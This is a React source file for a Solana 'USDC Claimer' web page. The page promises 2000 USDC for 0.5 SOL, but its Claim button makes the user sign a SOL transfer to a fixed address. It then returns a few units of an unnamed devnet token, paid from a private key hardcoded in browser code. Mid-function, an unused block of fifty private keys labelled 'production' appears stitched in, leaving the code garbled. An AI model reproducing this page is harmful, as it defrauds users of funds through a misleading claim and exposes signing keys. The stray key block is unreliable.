/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "x7MUa2NapFUcy7FcWG7TtwWhi5h6aF5hSgog2dz3YS46UMJ61m89cXSdEBsr4NV9apzn6n1V16UsuPkZjPTx8VV"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4VtuNRedTQRuxud1EVyT9YFz7PL3cRBXarQZAS1HgwwcgwDtkcUU2ico2uhysuYm5sffPspFpFLDeEexk1rKXUhx",
  "key1": "3QUAeu8KRLpvVJhna47tQMKMRUjWUqYhkQuz3PBxPb54NCWDnybdTdHWskQGaccb1iX4LYLAzH42qhSAydTLxbpP",
  "key2": "5PTX5PDry58Y6YnZcA4TFKTc35WUuEbxux3m34fZwe88rbusjUZNbPNExEAAx4XJAM4KvxWvH4TuEMM4hutZ7vD4",
  "key3": "WM6KxadCECo74aowjNpbXWxhfJgDEiKsyMjRNidGzdNfh29ZyYJRkPue2KNUrCgW2YcKaP5h5F6jbgm8GYjoEp8",
  "key4": "2GRTsCMjCfZqzQhBc9yevGAzmzLAfouzCHdf4mFEujGCbqV1LQw6iHYuCSGmj9hbRPC3N6zXWdvrst2HdVr2TNVo",
  "key5": "3sMHcYNiR5nPonwGacxVsmUaFdbYrokxTp5rnjZ46VPhVgvWGAXMe6XVLza9BVbgSzuZPLh8sHc4XP8FFdxZE7wq",
  "key6": "bVHUwitV95US1ttQJjhtY98QtfHPq8Qp9oWhyGa6K8EDwyHDHH9urNXrbDqpYWKG7sHCLsEdjvd1iBad6KBCdcc",
  "key7": "49Gqox7yBZzXGC1E6CBqdnwDAcKRcaFFxp7tgFub4ubxSRQscKGC9rJuRZq2b9xCQ83QZGDxsVdCrSbkRwq1fjvP",
  "key8": "57PCLwbi1eGZDLxDw9ztCb6grSainSzMNS77NHK2GJnC5ekNU1VdqwfSwqyDodUfJNWNXLQrR2ZQcrNBnoBmTQkh",
  "key9": "5y4Rs5To9FHGqbKPRbU8t4L5iXpRCSiSHgurEg5mKSz2wPqzm2g51YUR7FRHMr8QdMtBiYdgpb1cu69vUx65p1qK",
  "key10": "44TtVRVaAVPKanLJH55QtUvDrQutAWLA1WhKcV4NKagwkAFc5NsnZ5AK4NDK4kXQNse7EqN1oabeL6ky93pyhXqd",
  "key11": "58R8PjGnZgKLi2w7pW17KiWkG5SudFijKkTRL7V3gqsN9ovTJ3mSS64pRJ5FgU1geYkYPjrAFntYfrrMQW6D11SE",
  "key12": "5uUuFm67C74Wj9S6sSfscitagF1kRQiEYG5R5wMYvDZhmJzya9BksMg9Tff1FjqHx3a3J6cTAKYz7FBzS5FegkYi",
  "key13": "3BEk7tqMY9UNKLf4g5GpJtjMGM2tQFjFnLmJ6998LC1CuTypDYE4835cTpEC2582VWKLD3jQsphZUSsJXgY77fSh",
  "key14": "5y4VTrQfcg4AqJkokv2Zi1zuwWTVkoAVa8Eq5H7gB8YfqNkQUiKBuMKfdyxBT8Shy2JuMyXCLWJS36oaznu1TLy5",
  "key15": "5frMBep5DERXuNycRSrcE8EVW9HVbh4DRsyzt8nkDbmA1oRKZ6jz1sn4rh3Nu3nfirvX3VvMck2NZEousLWASDXr",
  "key16": "3n1yzxSZd5twsU49Fuj8759fv4GFExNh3QzC6NkfFeqYEiYmr5xu7yrDHTqZE6zCQTp6o2ttWGcRU28Bj4UnUQQ4",
  "key17": "2pEnfL6JPja8wamCeGQUQRRjvYUKwLENikNy7VAytXqpa2DnXuRUQWqK2g6efgCgYkC9aiKmd3JH93oucHvCH8GZ",
  "key18": "3jr1skQxgEn5Jq7BwXnZSz49PB4sZnzaHhWz3scKY3y5N7quZGfpmgGmvbMLiUhAD75kg6XaLQ858GjwCXCt8ydH",
  "key19": "2UnuAK1McBcco46hKZFb3RJcqgTU8Tc2enJPL8DCdvJeprAjsCr73znxJFeiqYqxTLwyAhrD6bydgUYjkNbC7CDg",
  "key20": "2g8g8gb1FsDyvYB3EQ9a4fDcKnn11pz3nFXaSjozShTi7eLeVnmSrZrm8cSM1CPGTyqCwkmn6vusvuRHh2FfnTam",
  "key21": "5beUj63NJkg1WUintbSyJCYs6MctzGGRgGTJrHdk4mt78dyoyegJHMAv3thFGXECgeTQebUPQyZU5GkbwomXGAYW",
  "key22": "2cWiQCSeTiwr8wuso6gQ8VAo6W2YLNvjW4HqChbsXouLJ2EvNWwauR2aUXbduHLjT6NiBbbanhPX641nGye8Mee3",
  "key23": "4Q2Ug4gvvAfsaAcaDezFPgpXeNRFYa1fZPma3gw7F4vEqWJGWxdewXKGumCjDfnQPiuqyXyMdWZpN9uuzuk3wXsW",
  "key24": "8WJkZKLKGCtTBv83Dzgi8H5v2rv4pwixQ557ToJKAkzdbCiXnBE5c94J7BfnPa6ayqsho9xDkXxCG7JsxdccHvs",
  "key25": "26FTrDYbV9Vib8hDXEMuz1ZGpVjV9E3F5RDEuyiUyKwqHqmzjhF7oHkCTeeLykaNtTdbbRfJ4Nvp7qEQ1hJZpLf9",
  "key26": "4jzeGCQnWiXPgbc4f7MvzpUYxLZ4ToodEn3s2GtAkeCS2bTMydGcgyuNGW3eQCsptAmSFE3bTNfh8gaH2UvkY8qb",
  "key27": "CYRDoMVaJWBZdHUbcmmS6E68FAEBL9N4spN2RGdG6TyGv9ztdcKtG7eUKi7jPWwyLi9YU5DDe5NMhxnmPBmpdck",
  "key28": "2HziY7hbPJT5ZMBXMqNTxyE4E7rk4xvdPso1Pc6cfz7d45MHV5vJhFBDk9VLiENQnhEtKbXWsQVWHvo7oRNooSE9",
  "key29": "38yyhKrZFXzYU5mLwWiP7Dqqe1pgthzjixBgQL8FDwQM5goaN4zSx7Fb8HhGGQpXMjeVHYqSupLa3gWpFmQ4WMaV",
  "key30": "Jv1BM5E1Rw8NqLfh1UaL3Qmg62MQ6ujoGhzmG5pwPYKqPficrcU7gA8yjcMXsFu362kahuj8Qd4ZzHi9tTq1gxu",
  "key31": "3Q8PCeyXidYALkDrJFMXtCFjhGxRF2LqrX182XFQLA6yDfZ1iTY9dkexFNExi1STBWYjX8nQCx3MYHv3k2CmYjDV",
  "key32": "3jmNZoMLhSf66AiVWc7QyLqvUa9cjWEWadtsMWDKQFm8kGrKoGREmXgo7QmzPbf4xycToeu7tGkeeopcQrRFqweF",
  "key33": "5btwEvbajVTA9sTnNGJwrT4aRELorjVR8brsbzn9mwXooCV6CwSw6s1YyRssS3ifqtyrTGBFfVBWtVMJUoAy8f4R",
  "key34": "4fU3Zu4uGc4zU2qiJphiLzGcJrrhVWC3bD84XAwpcSCz27a264mPcuAbp34mX346WNWwRzUEaqC3oiTdk58eaqAj",
  "key35": "3XHMay7oprn12TR43JEpk9gzvFV1N7aokEfwKT8LU7h2q4h2mKKv61PtUxtrMCD69vi2cbSPUBFKVpWwJhHXydBX",
  "key36": "2MeUCS53kNY83mdyH38VyuNEVsW9VJQpGuCtDp9ryQz3wS37mu2v2vuwee1cLB9jGBPQhaZ4SZb6xjyk1SY3wqHQ",
  "key37": "2QaHBPm6RfkvDJYNKB2QoJpPTF6z1JTjNXnm5MzYPREsTBQbGia9hPvns9A8sWqCrRr2ah6pkBxYM5aGtQe8YnzB",
  "key38": "2yQEDMuNrMEWGKu2C41vnwuJPC6DbA6kHAtR9zZAdEm8Ht55w9dWQ46Kna3aDaDp9iZGPjZr4YSowV93JEwu6BEq",
  "key39": "wf6DZ6CMEi1yh5LmjR6PrGKaKXBQt3pMAfyCTQUmkDVnDQVup3Xt748TyH1m2EbjkAeUtjDxU3qVeVziFExV1CC",
  "key40": "4zNC9eJDGqSXjGMzDVtW3Mg5DDyecRUASPbYRRmqnw87bKhg9ooDC5g8gf8wud5m9S9BVAwASc9Qiw3scxGkcS6K",
  "key41": "427tnMiY6LXDJxiqQimXAe7X6MqHtKGT6mpo944rM9QZR5g8Lg16cgZGxo3wV1H3Nvi3wkmUSzk4CNmEkZDbHd4R",
  "key42": "2FFepocJz9sFYWCKmf53hYcckMz9ZyUWWcU633LKFWsrQMErYj97AehJDjF2AF4W4ew7zweZFphLZMXzwfHMz4A7",
  "key43": "3ERp68ghnWbxf5LXkZYJghx9o1qPmCUHPnHimpjx6Ad52oMC7UKveRsvYC1UZLbuodg7QaH36z9UAPCVtsR1tyxp",
  "key44": "3PjtmWyhZNZBftziNZKVm3v42wdHy1CaNZ71nypkxzEiaq5Yx1g6VUTfseug86CodyKvimbZ4ma1zYRANxKpviYe",
  "key45": "2pkvXqdF7cqoV61cPbdHUPW55DMeSMPCg1aEjcFY6gc4f3wLrK97mBsNfRT6Vfwb6dBCiq9EmxADi4yQwxMYkUh9",
  "key46": "4UKoxCQY8Eqnyh4DUAfxJ72hpkto9fJCjzo5KRgeLUvRxX2j4Q9D2iSh14m6jbKm95ATMucfzE3oDSg4Y39WCDsB",
  "key47": "3ppaVuKkXaYQnfbNYWhK9F4QnMKid8cueM6X9nFzHoV4BXp9QFRb6rorti3JVJxDXaVjh2VD6CZENar8sby3xSFA",
  "key48": "2bENwu4bHfdVPBLjvMf4zauEpSw6mauc1evmRPAak1LVGsLZbaqHCha7y3rKrKwXt8HBTb8ZHA2vV4zfqBdrTKaq",
  "key49": "4mNxr5HPDX4ykwSZiFDcif8177xcduTWy7pgvinaQaqVsFiP7F7gqEyPogrgeUobLL5ZEW6JaRAyZB4PF2S7FZnU"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
